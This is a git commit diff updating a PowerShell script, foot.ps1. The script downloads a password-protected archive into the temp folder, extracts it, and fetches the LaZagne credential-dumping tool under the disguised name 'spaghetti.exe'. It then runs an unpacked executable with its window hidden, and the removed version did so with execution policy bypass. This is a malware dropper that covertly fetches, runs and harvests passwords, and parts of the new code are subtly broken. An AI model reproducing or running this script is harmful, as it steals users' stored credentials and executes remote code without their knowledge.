e2a48c41b4183d375d5093445cd0db6acadf8a93
bakgatviooldoos <56836858+bakgatviooldoos@users.noreply.github.com>
2023-07-25 13:13:51 +0200

    Update foot.ps1

--- foot.ps1
+++ foot.ps1
@@ -5,18 +5,26 @@ param (
 # Download the archive from GitHub
 $downloadUrl = "https://github.com/bakgatviooldoos/bascillaneous/raw/main/archive.zip"
 $zipFilePath = "$env:TEMP\archive.zip"
-Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
 
-Start-Sleep 10
+$webRequest = Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath
+$webRequest | Wait-Process
 
 # Unpack the password-protected ZIP archive
 $extractedFolderPath = "$env:TEMP\HOME"
-$arguments = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p$Password"
-Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -Wait
+$arguments           = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p$Password"
 
-Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$extractedFolderPath\spaghetti.exe"
+$extractionProcess = Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -PassThru
+$extractionProcess | Wait-Process
+
+# Download LaZagne executable
+$laZagneUrl  = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
+$laZagnePath = "$extractedFolderPath\spaghetti.exe"
+
+$laZagneRequest = Invoke-WebRequest -Uri $laZagneUrl -OutFile $laZagnePath
+$laZagneRequest | Wait-Process
 
 $executablePath = "$extractedFolderPath\self.exe"
 
 # Execute the unpacked file
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$executablePath`"" -WindowStyle Hidden
+$execution = Start-Process -FilePath $executablePath -WindowStyle Hidden -PassThru $true
+$execution | Wait-Process
